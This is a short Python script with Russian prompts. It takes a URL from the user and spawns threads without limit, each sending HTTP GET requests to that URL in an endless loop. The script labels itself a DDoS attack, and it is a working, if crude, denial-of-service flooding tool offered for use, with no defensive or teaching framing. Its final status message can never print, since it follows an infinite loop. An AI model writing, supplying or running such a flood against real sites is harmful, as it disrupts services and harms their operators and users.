import threading
import requests
link = input('Введите ссылку: ')
def dos():
    while True:
        requests.get(link)
while True:
    threading.Thread(target=dos).start()
    threading.Thread(target=dos).start()
    threading.Thread(target=dos).start()
print("DDos атака началась! Чтобы выйти нажмите CTRL + C")

